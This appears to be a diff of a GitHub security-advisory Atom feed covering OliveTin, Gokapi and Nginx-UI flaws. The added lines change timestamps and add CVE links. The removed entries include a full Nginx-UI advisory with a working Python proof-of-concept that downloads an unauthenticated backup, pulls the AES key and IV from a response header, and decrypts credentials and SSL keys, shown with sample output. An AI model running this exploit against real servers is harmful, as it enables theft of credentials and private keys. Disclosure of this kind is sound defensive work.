 <li><a href="https://github.com/advisories/GHSA-p443-p7w5-2f7f">https://github.com/advisories/GHSA-p443-p7w5-2f7f</a></li>
 </ul>
 ]]></content>
@@ -565,7 +1019,7 @@ Because OliveTin actions execute system shell commands, this can lead to:</li>
         <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin Session Fixation: Logout Fails to Invalidate Server-Side Session]]></title>
         <id>https://github.com/advisories/GHSA-gq2m-77hf-vwgh</id>
         <link href="https://github.com/advisories/GHSA-gq2m-77hf-vwgh"/>
-        <updated>2026-03-05T22:06:53.000Z</updated>
+        <updated>2026-03-06T22:52:15.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>OliveTin does not revoke server-side sessions when a user logs out. Although the browser cookie is cleared, the corresponding session remains valid in server storage until expiry (default ≈ 1 year).</p>
 <p>An attacker with a previously stolen or captured session cookie can continue authenticating after logout, resulting in a post-logout authentication bypass.</p>
@@ -662,6 +1116,7 @@ SID=$(printf '%s\n' "$LOGIN" | awk -F'[=;]' '/olivetin-sid-local/{print $2}')
 <li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-gq2m-77hf-vwgh">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-gq2m-77hf-vwgh</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/commit/d6a0abc3755d43107be1939567c52953bcbec3d5">https://github.com/OliveTin/OliveTin/commit/d6a0abc3755d43107be1939567c52953bcbec3d5</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1">https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30224">https://nvd.nist.gov/vuln/detail/CVE-2026-30224</a></li>
 <li><a href="https://github.com/advisories/GHSA-gq2m-77hf-vwgh">https://github.com/advisories/GHSA-gq2m-77hf-vwgh</a></li>
 </ul>
 ]]></content>
@@ -677,7 +1132,7 @@ SID=$(printf '%s\n' "$LOGIN" | awk -F'[=;]' '/olivetin-sid-local/{print $2}')
         <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin has JWT Audience Validation Bypass in Local Key and HMAC Modes]]></title>
         <id>https://github.com/advisories/GHSA-g962-2j28-3cg9</id>
         <link href="https://github.com/advisories/GHSA-g962-2j28-3cg9"/>
-        <updated>2026-03-05T22:06:48.000Z</updated>
+        <updated>2026-03-06T22:52:11.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>When JWT authentication is configured using either:</p>
 <ul>
@@ -782,6 +1237,7 @@ It is strictly an authentication validation flaw.</p>
 <li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-g962-2j28-3cg9">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-g962-2j28-3cg9</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/commit/e97d8ecbd8d6ba468c418ca496fcd18f78131233">https://github.com/OliveTin/OliveTin/commit/e97d8ecbd8d6ba468c418ca496fcd18f78131233</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1">https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30223">https://nvd.nist.gov/vuln/detail/CVE-2026-30223</a></li>
 <li><a href="https://github.com/advisories/GHSA-g962-2j28-3cg9">https://github.com/advisories/GHSA-g962-2j28-3cg9</a></li>
 </ul>
 ]]></content>
@@ -1226,400 +1682,5 @@ curl: (18) transfer closed with 1048563 bytes remaining to read
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-05T18:57:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/forceu/gokapi] Gokapi has Stored XSS in SVG Hotlinks]]></title>
-        <id>https://github.com/advisories/GHSA-3c22-5j5m-4jq7</id>
-        <link href="https://github.com/advisories/GHSA-3c22-5j5m-4jq7"/>
-        <updated>2026-03-06T15:17:01.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>If a malicious authenticated user uploads SVG and creates a hotlink for it, they achieve stored XSS.</p>
-<h3 id="details">Details</h3>
-<p>The hotlinking functionality fails to properly handle scripts included in the SVGs, allowing authenticated attackers with the ability to upload and hotlink file to execute arbitrary JS.</p>
-<p><em>Issue found by <a href="https://aisafe.io/">aisafe.io</a></em></p>
-<h3 id="impact">Impact</h3>
-<p>Authenticated attackers with the ability to upload and hotlink files can execute arbitrary JavaScript.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Forceu/Gokapi/security/advisories/GHSA-3c22-5j5m-4jq7">https://github.com/Forceu/Gokapi/security/advisories/GHSA-3c22-5j5m-4jq7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28683">https://nvd.nist.gov/vuln/detail/CVE-2026-28683</a></li>
-<li><a href="https://github.com/Forceu/Gokapi/releases/tag/v2.2.3">https://github.com/Forceu/Gokapi/releases/tag/v2.2.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-3c22-5j5m-4jq7">https://github.com/advisories/GHSA-3c22-5j5m-4jq7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3c22-5j5m-4jq7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-05T18:40:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/forceu/gokapi] Gokapi has Data Leak in Upload Status Stream]]></title>
-        <id>https://github.com/advisories/GHSA-c36c-7pc2-f2ph</id>
-        <link href="https://github.com/advisories/GHSA-c36c-7pc2-f2ph"/>
-        <updated>2026-03-06T15:16:56.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>The upload status SSE implementation on <code>/uploadStatus</code> publishes global upload state to any authenticated listener and includes <code>file_id</code> values that are not scoped to the requesting user. </p>
-<h2 id="impact">Impact</h2>
-<p>Any authenticated user can observe other users' file identifiers and retrieve unauthorized content, causing cross-tenant data exposure and loss of confidentiality for uploaded documents.</p>
-<p><em>Issue found by <a href="https://aisafe.io">aisafe.io</a></em></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Forceu/Gokapi/security/advisories/GHSA-c36c-7pc2-f2ph">https://github.com/Forceu/Gokapi/security/advisories/GHSA-c36c-7pc2-f2ph</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28682">https://nvd.nist.gov/vuln/detail/CVE-2026-28682</a></li>
-<li><a href="https://github.com/Forceu/Gokapi/releases/tag/v2.2.3">https://github.com/Forceu/Gokapi/releases/tag/v2.2.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-c36c-7pc2-f2ph">https://github.com/advisories/GHSA-c36c-7pc2-f2ph</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c36c-7pc2-f2ph</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-05T18:37:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI Vulnerable to Unauthenticated Backup Download with Encryption Key Disclosure]]></title>
-        <id>https://github.com/advisories/GHSA-g9w5-qffc-6762</id>
-        <link href="https://github.com/advisories/GHSA-g9w5-qffc-6762"/>
-        <updated>2026-03-05T22:37:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>/api/backup</code> endpoint is accessible without authentication and discloses the encryption keys required to decrypt the backup in the <code>X-Backup-Security</code> response header. This allows an unauthenticated attacker to download a full system backup containing sensitive data (user credentials, session tokens, SSL private keys, Nginx configurations) and decrypt it immediately.</p>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CWE</td>
-<td>CWE-306: Missing Authentication for Critical Function + CWE-311: Missing Encryption of Sensitive Data</td>
-</tr>
-<tr>
-<td>Affected File</td>
-<td><code>api/backup/router.go</code></td>
-</tr>
-<tr>
-<td>Affected Function</td>
-<td><code>CreateBackup</code> (lines 8-11 in router, implementation in <code>api/backup/backup.go:13-38</code>)</td>
-</tr>
-<tr>
-<td>Secondary File</td>
-<td><code>internal/backup/backup.go</code></td>
-</tr>
-<tr>
-<td>CVSS 3.1</td>
-<td>9.8 (Critical)</td>
-</tr>
-<tr>
-<td>CVSS Vector</td>
-<td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td>
-</tr>
-</tbody></table>
-<h2 id="root-cause">Root Cause</h2>
-<p>The vulnerability exists due to two critical security flaws:</p>
-<h3 id="1-missing-authentication-on-apibackup-endpoint">1. Missing Authentication on /api/backup Endpoint</h3>
-<p>In <code>api/backup/router.go:9</code>, the backup endpoint is registered without any authentication middleware:</p>
-<pre><code class="language-go">func InitRouter(r *gin.RouterGroup) {
-    r.GET("/backup", CreateBackup)  // No authentication required
-    r.POST("/restore", middleware.EncryptedForm(), RestoreBackup)  // Has middleware
-}
-</code></pre>
-<p>For comparison, the restore endpoint correctly uses middleware, while the backup endpoint is completely open.</p>
-<h3 id="2-encryption-keys-disclosed-in-http-response-headers">2. Encryption Keys Disclosed in HTTP Response Headers</h3>
-<p>In <code>api/backup/backup.go:22-33</code>, the AES-256 encryption key and IV are sent in plaintext via the <code>X-Backup-Security</code> header:</p>
-<pre><code class="language-go">func CreateBackup(c *gin.Context) {
-    result, err := backup.Backup()
-    if err != nil {
-        cosy.ErrHandler(c, err)
-        return
-    }
-
-    // Concatenate Key and IV
-    securityToken := result.AESKey + ":" + result.AESIv  // Keys sent in header
-
-    // ...
-    c.Header("X-Backup-Security", securityToken) // Keys exposed to anyone
-
-    // Send file content
-    http.ServeContent(c.Writer, c.Request, fileName, modTime, reader)
-}
-</code></pre>
-<p>The encryption keys are Base64-encoded AES-256 key (32 bytes) and IV (16 bytes), formatted as <code>key:iv</code>.</p>
-<h3 id="3-backup-contents">3. Backup Contents</h3>
-<p>The backup archive (created in <code>internal/backup/backup.go</code>) contains:</p>
-<pre><code class="language-go">// Files included in backup:
-- nginx-ui.zip (encrypted)
-  └── database.db          // User credentials, session tokens
-  └── app.ini              // Configuration with secrets
-  └── server.key/cert      // SSL certificates
-
-- nginx.zip (encrypted)
-  └── nginx.conf           // Nginx configuration
-  └── sites-enabled/*      // Virtual host configs
-  └── ssl/*                // SSL private keys
-
-- hash_info.txt (encrypted)
-  └── SHA-256 hashes for integrity verification
-</code></pre>
-<p>All files are encrypted with AES-256-CBC, but the keys are disclosed in the response.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="python-script">Python script</h3>
-<pre><code class="language-python">#!/usr/bin/env python3
-
-"""
-POC: Unauthenticated Backup Download + Key Disclosure via X-Backup-Security
-
-Usage:
-  python poc.py --target http://127.0.0.1:9000 --out backup.bin --decrypt
-"""
-
-import argparse
-import base64
-import os
-import sys
-import urllib.parse
-import urllib.request
-import zipfile
-from io import BytesIO
-
-try:
-    from Crypto.Cipher import AES
-    from Crypto.Util.Padding import unpad
-except ImportError:
-    print("Error: pycryptodome required for decryption")
-    print("Install with: pip install pycryptodome")
-    sys.exit(1)
-
-
-def _parse_keys(hdr_val: str):
-    """
-    Parse X-Backup-Security header format: "base64_key:base64_iv"
-    Example: e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=:7XdVSRcgYfWf7C/J0IS8Cg==
-    """
-    v = (hdr_val or "").strip()
-
-    # Format is: key:iv (both base64 encoded)
-    if ":" in v:
-        parts = v.split(":", 1)
-        if len(parts) == 2:
-            return parts[0].strip(), parts[1].strip()
-
-    return None, None
-
-
-def decrypt_aes_cbc(encrypted_data: bytes, key_b64: str, iv_b64: str) -&gt; bytes:
-    """Decrypt using AES-256-CBC with PKCS#7 padding"""
-    key = base64.b64decode(key_b64)
-    iv = base64.b64decode(iv_b64)
-
-    if len(key) != 32:
-        raise ValueError(f"Invalid key length: {len(key)} (expected 32 bytes for AES-256)")
-    if len(iv) != 16:
-        raise ValueError(f"Invalid IV length: {len(iv)} (expected 16 bytes)")
-
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted = cipher.decrypt(encrypted_data)
-    return unpad(decrypted, AES.block_size)
-
-
-def extract_backup(encrypted_zip_path: str, key_b64: str, iv_b64: str, output_dir: str):
-    """Extract and decrypt the backup archive"""
-    print(f"\n[*] Extracting encrypted backup to {output_dir}")
-
-    os.makedirs(output_dir, exist_ok=True)
-
-    # Extract the main ZIP (contains encrypted files)
-    with zipfile.ZipFile(encrypted_zip_path, 'r') as main_zip:
-        print(f"[*] Main archive contains: {main_zip.namelist()}")
-        main_zip.extractall(output_dir)
-
-    # Decrypt each file
-    encrypted_files = ["hash_info.txt", "nginx-ui.zip", "nginx.zip"]
-
-    for filename in encrypted_files:
-        filepath = os.path.join(output_dir, filename)
-        if not os.path.exists(filepath):
-            print(f"[!] Warning: {filename} not found")
-            continue
-
-        print(f"[*] Decrypting {filename}...")
-
-        with open(filepath, "rb") as f:
-            encrypted = f.read()
-
-        try:
-            decrypted = decrypt_aes_cbc(encrypted, key_b64, iv_b64)
-
-            # Write decrypted file
-            decrypted_path = filepath.replace(".zip", "_decrypted.zip") if filename.endswith(".zip") else filepath + ".decrypted"
-            with open(decrypted_path, "wb") as f:
-                f.write(decrypted)
-
-            print(f"    → Saved to {decrypted_path} ({len(decrypted)} bytes)")
-
-            # If it's a ZIP, extract it
-            if filename.endswith(".zip"):
-                extract_dir = os.path.join(output_dir, filename.replace(".zip", ""))
-                os.makedirs(extract_dir, exist_ok=True)
-                with zipfile.ZipFile(BytesIO(decrypted), 'r') as inner_zip:
-                    inner_zip.extractall(extract_dir)
-                    print(f"    → Extracted {len(inner_zip.namelist())} files to {extract_dir}")
-
-        except Exception as e:
-            print(f"    ✗ Failed to decrypt {filename}: {e}")
-
-    # Show hash info
-    hash_info_path = os.path.join(output_dir, "hash_info.txt.decrypted")
-    if os.path.exists(hash_info_path):
-        print(f"\n[*] Hash info:")
-        with open(hash_info_path, "r") as f:
-            print(f.read())
-
-def main():
-    ap = argparse.ArgumentParser(
-        description="Nginx UI - Unauthenticated backup download with key disclosure"
-    )
-    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
-    ap.add_argument("--out", default="backup.bin", help="Where to save the encrypted backup")
-    ap.add_argument("--decrypt", action="store_true", help="Decrypt the backup after download")
-    ap.add_argument("--extract-dir", default="backup_extracted", help="Directory to extract decrypted files")
-
-    args = ap.parse_args()
-
-    url = urllib.parse.urljoin(args.target.rstrip("/") + "/", "api/backup")
-
-    # Unauthenticated request to the backup endpoint
-    req = urllib.request.Request(url, method="GET")
-
-    try:
-        with urllib.request.urlopen(req, timeout=20) as resp:
-            hdr = resp.headers.get("X-Backup-Security", "")
-            key, iv = _parse_keys(hdr)
-            data = resp.read()
-    except urllib.error.HTTPError as e:
-        print(f"[!] HTTP Error {e.code}: {e.reason}")
-        sys.exit(1)
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        sys.exit(1)
-
-    with open(args.out, "wb") as f:
-        f.write(data)
-
-    # Key/IV disclosure in response header enables decryption of the downloaded backup
-    print(f"\nX-Backup-Security: {hdr}")
-    print(f"Parsed AES-256 key: {key}")
-    print(f"Parsed AES IV    : {iv}")
-
-    if key and iv:
-        # Verify key/IV lengths
-        try:
-            key_bytes = base64.b64decode(key)
-            iv_bytes = base64.b64decode(iv)
-            print(f"\n[*] Key length: {len(key_bytes)} bytes (AES-256 ✓)")
-            print(f"[*] IV length : {len(iv_bytes)} bytes (AES block size ✓)")
-        except Exception as e:
-            print(f"[!] Error decoding keys: {e}")
-            sys.exit(1)
-
-        if args.decrypt:
-            try:
-                extract_backup(args.out, key, iv, args.extract_dir)
-
-            except Exception as e:
-                print(f"\n[!] Decryption failed: {e}")
-                import traceback
-                traceback.print_exc()
-                sys.exit(1)
-    else:
-        print("\n[!] Failed to parse encryption keys from X-Backup-Security header")
-        print(f"    Header value: {hdr}")
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<pre><code class="language-bash"># Download and decrypt backup (no authentication required)
-# pip install pycryptodome
-python poc.py --target http://victim:9000 --decrypt
-</code></pre>
-<pre><code>X-Backup-Security: gnfd8BhrjzrxS7yLRoVvK+fyV9tjS50cfUn/RWuYjGA=:+rLZrXK3kbWFRK3qMpB3jw==
-Parsed AES-256 key: gnfd8BhrjzrxS7yLRoVvK+fyV9tjS50cfUn/RWuYjGA=
-Parsed AES IV    : +rLZrXK3kbWFRK3qMpB3jw==
-
-[*] Key length: 32 bytes (AES-256 âœ“)
-[*] IV length : 16 bytes (AES block size âœ“)
-
-[*] Extracting encrypted backup to backup_extracted
-[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
-[*] Decrypting hash_info.txt...
-    â†’ Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
-[*] Decrypting nginx-ui.zip...
-    â†’ Saved to backup_extracted/nginx-ui_decrypted.zip (12510 bytes)
-    â†’ Extracted 2 files to backup_extracted/nginx-ui
-[*] Decrypting nginx.zip...
-    â†’ Saved to backup_extracted/nginx_decrypted.zip (5682 bytes)
-    â†’ Extracted 17 files to backup_extracted/nginx
-
-[*] Hash info:
-nginx-ui_hash: 7c803b9b8791cebfad36977a321431182b22878c3faf8af544d05318ccb83ad5
-nginx_hash: 183458949e54794e1295449f0d6c1175bb92c1ee008be671ee9ee759aad73905
-timestamp: 20260129-122110
-version: 2.3.2
-</code></pre>
-<h3 id="http-request-raw">HTTP Request (Raw)</h3>
-<pre><code class="language-http">GET /api/backup HTTP/1.1
-Host: victim:9000
-</code></pre>
-<p><strong>No authentication required</strong> - this request will succeed and return:</p>
-<ul>
-<li>Encrypted backup as ZIP file</li>
-<li>Encryption keys in <code>X-Backup-Security</code> header</li>
-</ul>
-<h3 id="example-response">Example Response</h3>
-<pre><code class="language-http">HTTP/1.1 200 OK
-Content-Type: application/zip
-Content-Disposition: attachment; filename=backup-20260129-120000.zip
-X-Backup-Security: e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=:7XdVSRcgYfWf7C/J0IS8Cg==
-
-[Binary ZIP data]
-</code></pre>
-<p>The <code>X-Backup-Security</code> header contains:</p>
-<ul>
-<li><strong>Key</strong>: <code>e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=</code> (Base64-encoded 32-byte AES-256 key)</li>
-<li><strong>IV</strong>: <code>7XdVSRcgYfWf7C/J0IS8Cg==</code> (Base64-encoded 16-byte IV)</li>
-</ul>
-<img src="https://github.com/user-attachments/assets/a2e23c48-2272-4276-81de-fc700ff05b17" alt="screenshot" height="835" width="1430">
-
-<h2 id="resources">Resources</h2>
-<ul>
-<li><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306: Missing Authentication for Critical Function</a></li>
-<li><a href="https://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption of Sensitive Data</a></li>
-<li><a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP: Broken Authentication</a></li>
-<li><a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP: Sensitive Data Exposure</a></li>
-<li><a href="https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final">NIST: Key Management Guidelines</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762</a></li>
-<li><a href="https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final">https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final</a></li>
-<li><a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication</a></li>
-<li><a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27944">https://nvd.nist.gov/vuln/detail/CVE-2026-27944</a></li>
-<li><a href="https://github.com/advisories/GHSA-g9w5-qffc-6762">https://github.com/advisories/GHSA-g9w5-qffc-6762</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g9w5-qffc-6762</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-03-05T18:26:41.000Z</published>
     </entry>
 </feed>
